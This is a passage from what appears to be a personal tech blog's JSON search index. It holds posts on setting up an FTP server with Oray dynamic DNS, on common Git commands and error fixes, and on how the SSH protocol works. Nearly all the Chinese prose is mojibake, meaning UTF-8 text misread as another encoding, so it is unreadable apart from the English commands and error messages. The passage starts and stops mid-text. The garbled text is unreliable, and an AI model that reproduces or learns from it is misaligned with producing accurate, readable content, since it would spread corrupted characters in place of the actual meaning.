æˆæˆ‘ä»¬çš„FTPæœåŠ¡å™¨ä¸èƒ½è®¿é—®ã€‚\nè§£å†³æ–¹æ¡ˆï¼šé€‰æ‹©èŠ±ç”Ÿå£³è½¯ä»¶å®ŒæˆåŸŸåçš„åŠ¨æ€è§£æï¼ŒåŸŸåå›ºå®šï¼Œå³ä½¿æˆ‘ä»¬çš„è·¯ç”±å™¨å…¬ç½‘åœ°å€å˜åŒ–ï¼Œåªè¦ä½ åœ¨æœ¬åœ°è¿è¡Œçš„èŠ±ç”Ÿå£³è½¯ä»¶å®¢æˆ·ç«¯ï¼Œå°±å¯ä»¥å®æ—¶ç»‘å®šæœ€æ–°çš„åœ°å€åˆ°æˆ‘ä»¬çš„åŸŸååœ°å€ã€‚(æœ€ä¸»è¦çš„åŸå› ï¼šè¿™ä¸ªè½¯ä»¶æ˜¯å…è´¹çš„)\nä¸‹è½½å¹¶å®‰è£…èŠ±ç”Ÿå£³å®¢æˆ·ç«¯ 1.ä¸‹è½½å¹¶å®‰è£… 2.ç™»é™†å®¢æˆ·ç«¯(éœ€è¦å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œæ‰èƒ½å¾—åˆ°ä¸€ä¸ªå…è´¹çš„åŸŸå) 3.ç¡®å®šæ˜¯å¦ç»‘å®šäº†åŸŸå ä½¿ç”¨æ‚¨åœ¨èŠ±ç”Ÿå£³å®˜ç½‘æ³¨å†Œçš„å¸å·åå’Œå¯†ç å¡«å…¥èŠ±ç”Ÿå£³å®¢æˆ·ç«¯è½¯ä»¶ä¸­è¿›è¡Œç™»é™†ï¼›ç™»å½•Orayå¸å·ä¹‹åï¼Œåœ¨ä¸»ç•Œé¢ä¸Šé¢ç‚¹å‡»åŸŸååˆ—è¡¨ï¼Œè¿›å…¥åˆ°åŸŸååˆ—è¡¨çš„ç®¡ç†ç•Œé¢ã€‚\nç‚¹å‡»åŸŸåè¯Šæ–­ï¼Œç¡®å®šåŠ¨æ€åŸŸåè§£æç»“æœï¼š\nå¦‚æœå¾—åˆ°çš„åŸŸåç»“æœå°±æ˜¯è‡ªå·±è·¯ç”±å™¨çš„å…¬ç½‘åœ°å€ï¼Œé‚£ä¹ˆå¤–ç½‘çš„ç”µè„‘å°±å¯ä»¥é€šè¿‡è¿™ä¸ªåŸŸåæ¥è®¿é—®ä½ çš„FTPæœåŠ¡å™¨äº†ï¼Œå³ä½¿ä½ çš„ä¸»æœºå¤„åœ¨å±€åŸŸç½‘å†…ã€‚\nå¯æŸ¥çœ‹èŠ±ç”Ÿå£³è½¯ä»¶çš„å®˜ç½‘è¯´æ˜æ–‡æ¡£ï¼Œä½†æ˜¯ä¸æ¨èä½¿ç”¨å®ƒæåˆ°çš„FTPæœåŠ¡å™¨è½¯ä»¶(èƒ½å¤Ÿç›´æ¥ä½¿ç”¨å¾®è½¯çš„æœåŠ¡ï¼Œä¸ºä½•è¿˜ç”¨ä¸‹è½½è½¯ä»¶å®‰è£…åˆ°è‡ªå·±çš„ç”µè„‘ä¸Šé¢å‘¢)\nä½¿ç”¨èŠ±ç”Ÿå£³æœåŠ¡æ­å»ºFTPæœåŠ¡å™¨\n","date":1526779832,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526779832,"objectID":"6dd88c8025ce8725b09e81411bbb07a0","permalink":"http://www.guozet.me/post/FTP-server-by-oray/","publishdate":"2018-05-20T01:30:32Z","relpermalink":"/post/FTP-server-by-oray/","section":"post","summary":"å‰è¨€ åœ¨å®é™…ç½‘ç»œç¯å¢ƒä¸­å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨å±€åŸŸç½‘å†…ä¸¤å°ç”µè„‘ä¹‹é—´ï¼Œå¤–ç½‘ä¸å±€åŸŸç½‘å†…éƒ¨çš„ç”µè„‘ä¹‹é—´å®Œæˆå¤§æ–‡ä»¶çš„ä¼ è¾“ï¼Œåœ¨è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªå°é—®é¢˜ï¼Œå¸¸è§„çš„å°æ–‡ä»¶æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨QQæˆ–è€…Skypeè¿™ä¸€ç±»çš„å³æ—¶èŠå¤©è½¯ä»¶å°±å¯ä»¥åŠåˆ°ï¼Œä½†æ˜¯å½“æˆ‘ä»¬çš„æ–‡ä»¶æœ‰å‡ åä¸ªGé‚£ä¹ˆå¤§çš„æ—¶å€™ï¼Œå±€åŸŸç½‘å†…ä¸å¤–ç½‘ä¹‹é—´è¿›è¡Œå¤§æ–‡ä»¶ä¼ è¾“å°±æ²¡æœ‰é‚£ä¹ˆæ–¹ä¾¿äº†ã€‚\nèƒŒæ™¯ æˆ‘çš„ä¸»æœºï¼šWindows 10 æ——èˆ°ç‰ˆ(è·¯ç”±å™¨ä¸‹é¢çš„å±€åŸŸç½‘å†…)\nå¯¹æ–¹ä¸»æœºï¼šMac(ä¸ä¸æˆ‘çš„ä¸»æœºåœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…)\nè¦æ±‚: éœ€è¦å°†å¤§çº¦30Gçš„10ä¸ªè§†é¢‘æ–‡ä»¶ä¼ é€åˆ°å¯¹æ–¹ä¸»æœºä¸Šé¢\n","tags":null,"title":"èŠ±ç”Ÿå£³ä½œä¸ºåŸŸåè§£ææ¥æ­å»ºFTPæœåŠ¡å™¨","type":"post"},{"authors":null,"categories":"Git","content":"Gitå­æ¨¡å—:ä»“åº“ä¸­åŒ…å«å¦å¤–ä¸€ä¸ªä»“åº“ åœºæ™¯ åœ¨å·¥ä½œçš„é¡¹ç›®ä¸­éœ€è¦åŒ…å«å¦å¤–çš„é¡¹ç›®ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¼•å‡ºå…¶ä»–çš„é¡¹ç›®ï¼Œä½†æ˜¯æˆ‘ä»¬å¸Œæœ›åœ¨å¼•å…¥çš„é¡¹ç›®å˜åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¾ˆå¿«çš„åˆå¹¶åˆ°æˆ‘ä»¬ç°æœ‰çš„åˆ†æ”¯ä¸­ã€‚\næ“ä½œæŒ‡ä»¤ ç°æœ‰repoåŠ å…¥å­repo åœ¨ä½ æƒ³è¦æ·»åŠ çš„ç›®å½•ä½ç½®è¾“å…¥æ·»åŠ å­repoçš„å‘½ä»¤å³å¯\ngit submodule add https://github.com/guozetang/paper_code_tracker\ræŸ¥çœ‹çŠ¶æ€å‚æ•°ï¼š git status\nåœ¨repo(ä¸æ˜¯å­repo)çš„æ ¹ç›®å½•æŸ¥çœ‹å½“å‰åŠ å…¥çš„å­æ¨¡å—(å­repo)ã€‚\n$ cat .gitmodules\r[submodule \u0026quot;python/paper_code_tracker\u0026quot;]\rpath = python/paper_code_tracker\rurl = https://github.com/guozetang/paper_code_tracker\ræäº¤æ·»åŠ çš„å­æ¨¡å— $ git commit -am \u0026quot;added subproject module\u0026quot;\r[master (root-commit) 9168027] added subproject module\r2 files changed, 7 insertions(+)\rcreate mode 100644 .gitmodules\rcreate mode 160000 python/paper_code_tracker\rå…¶ä»–æ›´å¤šæ“ä½œè¯·å‚è€ƒ: ã€Gitã€‘å­æ¨¡å—ï¼šä¸€ä¸ªä»“åº“åŒ…å«å¦ä¸€ä¸ªä»“åº“\nåˆ†æ”¯æ“ä½œ åœºæ™¯ å¼€å‘è¿‡ç¨‹ä¸­ç»å¸¸ç”¨åˆ°ä»masteråˆ†æ”¯copyä¸€ä¸ªå¼€å‘åˆ†æ”¯,è¿›è¡Œå¼€å‘\næ“ä½œæŒ‡ä»¤ä»‹ç» $git checkout master //åˆ‡æ¢åˆ°è¢«copyçš„åˆ†æ”¯ï¼ˆmasterï¼‰\r$git pull //ä»è¿œç«¯æ‹‰å–æœ€æ–°ç‰ˆæœ¬\r$git checkout -b NewBranch //Switched to a new branch 'dev'\r$git push origin NewBranch //æ–°å»ºåˆ†æ”¯pushåˆ°è¿œç«¯\ré‡åˆ°çš„é—®é¢˜ $git pull\rThere is no tracking information for the current branch.\rPlease specify which branch you want to merge with.\rSee git-pull(1) for details.\rgit pull \u0026lt;remote\u0026gt; \u0026lt;branch\u0026gt;\rIf you wish to set tracking information for this branch you can do so with:\rgit branch --set-upstream-to=origin/\u0026lt;branch\u0026gt; NewBranch\rç»è¿‡éªŒè¯ï¼Œå½“å‰çš„åˆ†æ”¯å¹¶æ²¡æœ‰å’Œæœ¬åœ°åˆ†æ”¯å…³è”ï¼Œæ ¹æ®æç¤ºè¿›è¡Œä¸‹ä¸€æ­¥ï¼š\nå…³è”\n$git branch --set-upstream-to=origin/NewBranch\næ³¨æ„ï¼šè¿™é‡Œbranchä¹‹åéƒ½æ˜¯æ²¡æœ‰ç©ºæ ¼çš„ï¼Œå¦‚æœæœ‰ç©ºæ ¼åˆ™æ˜¯é”™è¯¯å‘½ä»¤\nå†æ¬¡æ‹‰å–\n$git pull\nå…³è”è¿œç¨‹repo åœºæ™¯ æˆ‘ä»¬ç»å¸¸ç”±äºä¸€èµ·ä¸çŸ¥é“çš„é—®é¢˜ï¼Œé€ æˆæˆ‘ä»¬éœ€è¦åˆ é™¤.gitæ–‡ä»¶å¤¹ä¹‹åï¼Œä½¿ç”¨git initæ¥æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿™æ—¶å€™å°±éœ€è¦æˆ‘ä»¬å°†æ–°å»ºçš„repoå…³è”åˆ°è¿œç¨‹çš„repoä¸Šå»ã€‚\næ“ä½œå‘½ä»¤ä»‹ç» åœ¨æœ¬åœ°ç›®å½•ä¸‹å…³è”è¿œç¨‹repository git remote add origin git@github.com:git_username/repository_name.git\rå–æ¶ˆæœ¬åœ°ç›®å½•ä¸‹å…³è”çš„è¿œç¨‹åº“ï¼š git remote remove origin\ræ–‡ä»¶æ“ä½œ åœºæ™¯ å¦‚æœä¸€ä¸ªæ–‡ä»¶ä¸å°å¿ƒè¢«åˆ é™¤äº†ï¼Œå¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•æ¢å¤ã€‚\næ“ä½œå‘½ä»¤ä»‹ç» 1ã€éœ€è¦è®°ä½æ‰€éœ€æ¢å¤æ–‡ä»¶çš„åå­—å’Œç‰ˆæœ¬å·(commit id)\ngit checkout commit_id -- file_name\rfatal: remote origin already exists. å¦‚æœè¾“å…¥:\n$ git remote add origin git@github.com:djqiangï¼ˆgithubå¸å·åï¼‰/gitdemoï¼ˆé¡¹ç›®åï¼‰.git\næç¤ºå‡ºé”™ä¿¡æ¯ï¼šfatal: remote origin already exists.\nè§£å†³åŠæ³•å¦‚ä¸‹ï¼š\n1ã€å…ˆè¾“å…¥$ git remote rm origin\n2ã€å†è¾“å…¥$ git remote add origin git@github.com:djqiang/gitdemo.git å°±ä¸ä¼šæŠ¥é”™äº†ï¼\n3ã€å¦‚æœè¾“å…¥$ git remote rm origin è¿˜æ˜¯æŠ¥é”™çš„è¯ï¼Œerror: Could not remove config section \u0026lsquo;remote.origin\u0026rsquo;. æˆ‘ä»¬éœ€è¦ä¿®æ”¹gitconfigæ–‡ä»¶çš„å†…å®¹\n4ã€æ‰¾åˆ°ä½ çš„githubçš„å®‰è£…è·¯å¾„ï¼Œæˆ‘çš„æ˜¯\nC:\\Users\\ASUS\\AppData\\Local\\GitHub\\PortableGit_ca477551eeb4aea0e4ae9fcd3358bd96720bb5c8\\etc\n5ã€æ‰¾åˆ°ä¸€ä¸ªåä¸ºgitconfigçš„æ–‡ä»¶ï¼Œæ‰“å¼€å®ƒæŠŠé‡Œé¢çš„[remote \u0026ldquo;origin\u0026rdquo;]é‚£ä¸€è¡Œ\nåˆ æ‰å°±å¥½äº†ï¼\nPermission denied (publickey) å¦‚æœè¾“å…¥:\n$ ssh -T git@github.com\nå‡ºç°é”™è¯¯æç¤ºï¼šPermission denied (publickey).å› ä¸ºæ–°ç”Ÿæˆçš„keyä¸èƒ½åŠ å…¥sshå°±ä¼šå¯¼è‡´è¿æ¥ä¸ä¸Šgithubã€‚\nè§£å†³åŠæ³•å¦‚ä¸‹ï¼š\n1ã€å…ˆè¾“å…¥$ ssh-agentï¼Œå†è¾“å…¥$ ssh-add ~/.ssh/id_keyï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚\n2ã€å¦‚æœè¿˜æ˜¯ä¸è¡Œçš„è¯ï¼Œè¾“å…¥ssh-add ~/.ssh/id_key å‘½ä»¤åå‡ºç°æŠ¥é”™Could not open a connection to your authentication agent.è§£å†³æ–¹æ³•æ˜¯keyç”¨Git Guiçš„sshå·¥å…·ç”Ÿæˆï¼Œè¿™æ ·ç”Ÿæˆçš„æ—¶å€™keyå°±ç›´æ¥ä¿å­˜åœ¨sshä¸­äº†ï¼Œä¸éœ€è¦å†ssh-addå‘½ä»¤åŠ å…¥äº†ï¼Œå…¶å®ƒçš„userï¼Œtokenç­‰é…ç½®éƒ½ç”¨å‘½ä»¤è¡Œæ¥åšã€‚\n3ã€æœ€å¥½æ£€æŸ¥ä¸€ä¸‹åœ¨ä½ å¤åˆ¶id_rsa.pubæ–‡ä»¶çš„å†…å®¹æ—¶æœ‰æ²¡æœ‰äº§ç”Ÿå¤šä½™çš„ç©ºæ ¼æˆ–ç©ºè¡Œï¼Œæœ‰äº›ç¼–è¾‘å™¨ä¼šå¸®ä½ æ·»åŠ è¿™äº›çš„ã€‚\nerror:failed to push som refs to \u0026hellip;\u0026hellip;. å¦‚æœè¾“å…¥:\n$ git push origin master\næç¤ºå‡ºé”™ä¿¡æ¯ï¼šerror:failed to push som refs to \u0026hellip;\u0026hellip;.\nè§£å†³åŠæ³•å¦‚ä¸‹ï¼š\n1ã€å…ˆè¾“å…¥$ git pull origin master //å…ˆæŠŠè¿œç¨‹æœåŠ¡å™¨githubä¸Šé¢çš„æ–‡ä»¶æ‹‰ä¸‹æ¥\n2ã€å†è¾“å…¥$ git push origin master\n3ã€å¦‚æœå‡ºç°æŠ¥é”™ fatal: Couldn\u0026rsquo;t find remote ref masteræˆ–è€…fatal: \u0026lsquo;origin\u0026rsquo; does not appear to be a git repositoryä»¥åŠfatal: Could not read from remote repository.\n4ã€åˆ™éœ€è¦é‡æ–°è¾“å…¥$ git remote add origin git@github.com:djqiang/gitdemo.git\nä½¿ç”¨gitåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªé¡¹ç›®çš„è¿‡ç¨‹ $ makdir ~/hello-world //åˆ›å»ºä¸€ä¸ªé¡¹ç›®hello-world $ cd ~/hello-world //æ‰“å¼€è¿™ä¸ªé¡¹ç›® $ git init //åˆå§‹åŒ– $ touch README $ git add README //æ›´æ–°READMEæ–‡ä»¶ $ git commit -m 'first commit' //æäº¤æ›´æ–°ï¼Œå¹¶æ³¨é‡Šä¿¡æ¯â€œfirst commitâ€ $ git remote add origin [git@github.com:defnngj/hello-world.git](mailto:git@github.com:defnngj/hello-world.git) //è¿æ¥è¿œç¨‹githubé¡¹ç›® $ git push -u origin master //å°†æœ¬åœ°é¡¹ç›®æ›´æ–°åˆ°githubé¡¹ç›®ä¸Šå»\rPermission denied(publickey) âœ workspace_config git:(document) git push origin document\rPermission denied (publickey).\rfatal: Could not read from remote repository.\rPlease make sure you have the correct access rights\rand the repository exists.\rSolution:\nTesting: $ssh -T git@github.com If there is a mistake about: Permission Dnied(publickey), this is because your new private key is not fit with the public key in the server. Input: $ssh-agent, after that, you can inputssh-add ~/.ssh/id_key fatal: Could not read from remote repository. âœ workspace_config git:(document) git push origin document\rPermission denied (publickey).\rfatal: Could not read from remote repository.\rPlease make sure you have the correct access rights\rand the repository exists.\rå…³è”ä¸¤ä¸ªRep:ä¸€ä¸ªå¼€å‘repoï¼Œä¸€ä¸ªreleaseçš„repo ä½¿ç”¨åœºæ™¯ å›¢é˜Ÿåœ¨ä¸€ä¸ªprivateçš„ä»“åº“(repo1)ä¸­è¿›è¡Œé¡¹ç›®çš„å¼€å‘, ä½†æ˜¯åœ¨å¼€å‘çš„æŸä¸€ä¸ªè¿›åº¦çš„æ—¶å€™ï¼Œæƒ³å°†è¿™ä¸€ä¸ªç‰ˆæœ¬å‘å¸ƒå‡ºå»ï¼Œè¿™å°±éœ€è¦å»ºç«‹å¦å¤–ä¸€ä¸ªrepo2æ¥ç®¡ç†å‘å¸ƒçš„é¡¹ç›®ã€‚æˆ‘ä»¬æƒ³å®ç°èƒ½å¤Ÿåœ¨å¼€å‘çš„repo1é‡Œé¢æ·»åŠ ç›´æ¥å°†code push åˆ° repo2é‡Œé¢å»ã€‚ã€\næ“ä½œå‘½ä»¤ä»‹ç» å…ˆæ£€æŸ¥è‡ªå·±å½“å‰çš„è¿œç¨‹åˆ†æ”¯\ngit remote -v\rgithub https://github.com/zxbetter/test.git (fetch)\rgithub https://github.com/zxbetter/test.git (push)\rç„¶åæ·»åŠ å¦å¤–ä¸€ä¸ªç®¡ç†é¡¹ç›®å‘å¸ƒçš„repo2\ngit remote add oschina https://git.oschina.net/zxbetter/test.git\ræ³¨æ„ï¼Œè¿™é‡Œçš„åå­—æœ‰ç‚¹åŒºåˆ«ï¼Œrepo1å¯¹åº”çš„åå­—æ˜¯github test, è€Œrepo2å¯¹åº”çš„åå­—æ˜¯oschina test\ngit push oschina test\rå…³äºå…³è”ä¸¤ä¸ªrepoçš„å…¶ä»–ç”¨æ³•å‚è€ƒåšå®¢ï¼š ä¸€ä¸ªé¡¹ç›®pushåˆ°å¤šä¸ªè¿œç¨‹Gitä»“åº“\n","date":1526141671,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526141671,"objectID":"3caa4996f507b8c97ca06495b2f1bf5b","permalink":"http://www.guozet.me/post/Some-git-common-commands-in-life/","publishdate":"2018-05-12T16:14:31Z","relpermalink":"/post/Some-git-common-commands-in-life/","section":"post","summary":"Gitå­æ¨¡å—:ä»“åº“ä¸­åŒ…å«å¦å¤–ä¸€ä¸ªä»“åº“ åœºæ™¯ åœ¨å·¥ä½œçš„é¡¹ç›®ä¸­éœ€è¦åŒ…å«å¦å¤–çš„é¡¹ç›®ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¼•å‡ºå…¶ä»–çš„é¡¹ç›®ï¼Œä½†æ˜¯æˆ‘ä»¬å¸Œæœ›åœ¨å¼•å…¥çš„é¡¹ç›®å˜åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¾ˆå¿«çš„åˆå¹¶åˆ°æˆ‘ä»¬ç°æœ‰çš„åˆ†æ”¯ä¸­ã€‚\n","tags":"Git","title":"Gitä¸åŒåœºæ™¯å¸¸ç”¨å‘½ä»¤","type":"post"},{"authors":null,"categories":"Linux","content":"å‰è¨€ æœ€è¿‘ä½¿ç”¨SSHæ¥ç™»é™†DigitalOcean VPSçš„æ—¶å€™ï¼Œç¬¬ä¸€æ¬¡å¯¼å…¥SSHçš„æ—¶å€™å‡ºç°äº†ä¸€äº›é—®é¢˜ï¼Œç”±æ­¤å¯¹SSHåè®®è¯¦ç»†çš„å­¦ä¹ äº†ä¸€ç•ªã€‚åœ¨è¿™é‡Œå¯¹è‡ªå·±SSHçš„å­¦ä¹ åšä¸€ä¸ªå°ç»“ã€‚\nåŸºæœ¬æ¦‚å¿µ ä»€ä¹ˆæ˜¯SSH SSH(The Secure Shell)æ˜¯æŒ‡ä¸€ç§å°†æ‰€æœ‰ä¼ è¾“çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·\u0026quot;ä¸­é—´äºº\u0026quot;è¿™ç§æ”»å‡»æ–¹å¼å°±ä¸å¯èƒ½å®ç°äº†ï¼Œè€Œä¸”ä¹Ÿèƒ½å¤Ÿé˜²æ­¢DNSæ¬ºéª—å’ŒIPæ¬ºéª—ã€‚ä½¿ç”¨SSHï¼Œè¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„å¥½å¤„å°±æ˜¯ä¼ è¾“çš„æ•°æ®æ˜¯ç»è¿‡å‹ç¼©çš„ï¼Œæ‰€ä»¥å¯ä»¥åŠ å¿«ä¼ è¾“çš„é€Ÿåº¦ã€‚SSHæœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œå®ƒæ—¢å¯ä»¥ä»£æ›¿Telnetï¼Œåˆå¯ä»¥ä¸ºFTPã€Popã€ç”šè‡³ä¸ºPPPæä¾›ä¸€ä¸ªå®‰å…¨çš„\u0026quot;é€šé“\u0026quot;ã€‚\nå®˜æ–¹åè®®æ–‡æ¡£è¯·å‚è€ƒ: The Secure Shell (SSH) Protocol Architecture\nSSHåŸºæœ¬æ¡†æ¶ SSHåè®®åˆ†ä¸‰éƒ¨åˆ†ï¼š\nä¼ è¾“å±‚åè®®ï¼ˆThe Transport Layer Protocolï¼‰æä¾›æœåŠ¡å™¨è®¤è¯ï¼Œæ•°æ®æœºå¯†æ€§ï¼Œä¿¡æ¯å®Œæ•´æ€§ ç­‰çš„æ”¯æŒï¼›\nç”¨æˆ·è®¤è¯åè®®ï¼ˆThe User Authentication Protocolï¼‰ åˆ™ä¸ºæœåŠ¡å™¨æä¾›å®¢æˆ·ç«¯çš„èº«ä»½é‰´åˆ«ï¼›\nè¿æ¥åè®®ï¼ˆThe Connection Protocolï¼‰ å°†åŠ å¯†çš„ä¿¡æ¯éš§é“å¤ç”¨æˆè‹¥å¹²ä¸ªé€»è¾‘é€šé“ï¼Œæä¾›ç»™æ›´é«˜å±‚çš„åº”ç”¨åè®®ä½¿ç”¨ï¼› å„ç§é«˜å±‚åº”ç”¨åè®®å¯ä»¥ç›¸å¯¹åœ°ç‹¬ç«‹äºSSHåŸºæœ¬ä½“ç³»ä¹‹å¤–ï¼Œå¹¶ä¾é è¿™ä¸ªåŸºæœ¬æ¡†æ¶ï¼Œé€šè¿‡è¿æ¥åè®®ä½¿ç”¨SSHçš„å®‰å…¨æœºåˆ¶ã€‚\nSSHçš„ç§˜é’¥ç®¡ç† SSHåè®®è¦æ±‚æ¯ä¸€ä¸ªä½¿ç”¨æœ¬åè®®çš„ä¸»æœºéƒ½å¿…é¡»è‡³å°‘æœ‰ä¸€ä¸ªè‡ªå·±çš„ä¸»æœºå¯†é’¥å¯¹ï¼ŒæœåŠ¡æ–¹é€šè¿‡å¯¹å®¢æˆ·æ–¹ä¸»æœºå¯†é’¥çš„è®¤è¯ä¹‹åï¼Œæ‰èƒ½å…è®¸å…¶è¿æ¥è¯·æ±‚ã€‚ä¸€ä¸ªä¸»æœºå¯ä»¥ä½¿ç”¨å¤šä¸ªå¯†é’¥ï¼Œé’ˆå¯¹ä¸åŒçš„å¯†é’¥ç®—æ³•è€Œæ‹¥æœ‰ä¸åŒçš„å¯†é’¥ï¼Œä½†æ˜¯è‡³å°‘æœ‰ä¸€ç§æ˜¯å¿…å¤‡çš„ã€‚SSHåè®®å…³äºä¸»æœºç§˜é’¥è®¤è¯çš„æ–¹æ¡ˆæœ‰ä¸¤ç§ã€‚\næ–¹æ¡ˆä¸€ åœ¨ç¬¬ä¸€ç§æ–¹æ¡ˆä¸­ï¼Œä¸»æœºå°†è‡ªå·±çš„å…¬ç”¨å¯†é’¥åˆ†å‘ç»™ç›¸å…³çš„å®¢æˆ·æœºï¼Œå®¢æˆ·æœºåœ¨è®¿é—®ä¸»æœºæ—¶åˆ™ä½¿ç”¨è¯¥ä¸»æœºçš„å…¬å¼€å¯†é’¥æ¥åŠ å¯†æ•°æ®ï¼Œä¸»æœºåˆ™ä½¿ç”¨è‡ªå·±çš„ç§æœ‰å¯†é’¥æ¥è§£å¯†æ•°æ®ï¼Œä»è€Œå®ç°ä¸»æœºå¯†é’¥è®¤è¯ï¼Œç¡®å®šå®¢æˆ·æœºçš„å¯é èº«ä»½ã€‚åœ¨å›¾2ï¼ˆaï¼‰ä¸­å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·ä»ä¸»æœºAä¸Šå‘èµ·æ“ä½œï¼Œå»è®¿é—®ï¼Œä¸»æœºBå’Œä¸»æœºCï¼Œæ­¤æ—¶ï¼ŒAæˆä¸ºå®¢æˆ·æœºï¼Œå®ƒå¿…é¡»äº‹å…ˆé…ç½®ä¸»æœºBå’Œä¸»æœºCçš„å…¬å¼€å¯†é’¥ï¼Œåœ¨è®¿é—®çš„æ—¶å€™æ ¹æ®ä¸»æœºåæ¥æŸ¥æ‰¾ç›¸åº”çš„å…¬å¼€å¯†é’¥ã€‚å¯¹äºè¢«è®¿é—®ä¸»æœºï¼ˆä¹Ÿå°±æ˜¯æœåŠ¡å™¨ç«¯ï¼‰æ¥è¯´åˆ™åªè¦ä¿è¯å®‰å…¨åœ°å­˜å‚¨è‡ªå·±çš„ç§æœ‰å¯†é’¥å°±å¯ä»¥äº†ã€‚\nå¦å¤–ï¼ŒSSHåè®®æ¡†æ¶ä¸­è¿˜å…è®¸å¯¹ä¸»æœºå¯†é’¥çš„ä¸€ä¸ªæŠ˜ä¸­å¤„ç†ï¼Œé‚£å°±æ˜¯é¦–æ¬¡è®¿é—®å…è®¤è¯ã€‚é¦–æ¬¡è®¿é—®å…è®¤è¯æ˜¯æŒ‡ï¼Œåœ¨æŸå®¢æˆ·æœºç¬¬ä¸€æ¬¡è®¿é—®ä¸»æœºæ—¶ï¼Œä¸»æœºä¸æ£€æŸ¥ä¸»æœºå¯†é’¥ï¼Œè€Œå‘è¯¥å®¢æˆ·éƒ½å‘æ”¾ä¸€ä¸ªå…¬å¼€å¯†é’¥çš„æ‹·è´ï¼Œè¿™æ ·åœ¨ä»¥åçš„è®¿é—®ä¸­åˆ™å¿…é¡»ä½¿ç”¨è¯¥å¯†é’¥ï¼Œå¦åˆ™ä¼šè¢«è®¤ä¸ºéæ³•è€Œæ‹’ç»å…¶è®¿é—®ã€‚ æ–¹æ¡ˆäºŒ ç¬¬äºŒç§æ–¹æ¡ˆä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå¯†é’¥è®¤è¯ä¸­å¿ƒï¼Œæ‰€æœ‰ç³»ç»Ÿä¸­æä¾›æœåŠ¡çš„ä¸»æœºéƒ½å°†è‡ªå·±çš„å…¬å¼€å¯†é’¥æäº¤ç»™è®¤è¯ä¸­å¿ƒï¼Œè€Œä»»ä½•ä½œä¸ºå®¢æˆ·æœºçš„ä¸»æœºåˆ™åªè¦ä¿å­˜ä¸€ä»½è®¤è¯ä¸­å¿ƒçš„å…¬å¼€ å¯†é’¥å°±å¯ä»¥äº†ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå®¢æˆ·æœºåœ¨è®¿é—®æœåŠ¡å™¨ä¸»æœºä¹‹å‰ï¼Œè¿˜å¿…é¡»å‘å¯†é’¥è®¤è¯ä¸­å¿ƒè¯·æ±‚è®¤è¯ï¼Œè®¤è¯ä¹‹åæ‰èƒ½å¤Ÿæ­£ç¡®åœ°è¿æ¥åˆ°ç›®çš„ä¸»æœºä¸Šã€‚\nSSHçš„å·¥ä½œè¿‡ç¨‹ åœ¨æ•´ä¸ªé€šè®¯è¿‡ç¨‹ä¸­ï¼Œä¸ºå®ç° SSHçš„å®‰å…¨è¿æ¥ï¼ŒæœåŠ¡å™¨ç«¯ä¸å®¢æˆ·ç«¯è¦ç»å†å¦‚ä¸‹äº”ä¸ªé˜¶æ®µï¼š\nå®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿›è¡ŒSSHåè®®ç‰ˆæœ¬åå•†\næœåŠ¡å™¨å‘å®¢æˆ·ç«¯æä¾›è‡ªå·±çš„èº«ä»½è¯æ˜å’Œä¼šè¯å‚æ•°\nå®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªï¼ˆä¼šè¯ï¼‰å¯†é’¥\nåŒæ–¹å¯ç”¨åŠ å¯†å¹¶å®ŒæˆæœåŠ¡å™¨è®¤è¯\nå»ºç«‹å®‰å…¨è¿æ¥\næ¯ä¸ªé˜¶æ®µå‡æ¶‰åŠåˆ°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„å¤šæ¬¡äº¤äº’ï¼Œé€šè¿‡è¿™äº›äº¤äº’è¿‡ç¨‹å®ŒæˆåŒ…æ‹¬è¯ä¹¦ä¼ è¾“ã€ç®—æ³•åå•†ã€é€šé“åŠ å¯†ç­‰è¿‡ç¨‹ã€‚\nå®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿›è¡ŒSSHåè®®ç‰ˆæœ¬åå•† æœåŠ¡å™¨æ‰“å¼€ç«¯å£ 22ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ã€‚\nå®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘èµ· TCPåˆå§‹è¿æ¥è¯·æ±‚ï¼ŒTCPè¿æ¥å»ºç«‹åï¼ŒæœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€ç¬¬ä¸€ä¸ªæŠ¥æ–‡ï¼ŒåŒ…æ‹¬ç‰ˆæœ¬æ ‡å¿—å­—ç¬¦ä¸²ï¼Œæ ¼å¼ä¸ºâ€œSSHï¼\u0026lt;ä¸»åè®®ç‰ˆæœ¬å·\u0026gt;.\u0026lt;æ¬¡åè®®ç‰ˆæœ¬å·\u0026gt;ï¼\u0026lt;è½¯ä»¶ç‰ˆæœ¬å·\u0026gt;â€ï¼Œåè®®ç‰ˆæœ¬å·ç”±ä¸»ç‰ˆæœ¬å·å’Œæ¬¡ç‰ˆæœ¬å·ç»„æˆï¼Œè½¯ä»¶ç‰ˆæœ¬å·ä¸»è¦æ˜¯ä¸ºè°ƒè¯•ä½¿ç”¨ã€‚\nè¿™äº›åè®®æ˜¯ä»¥ 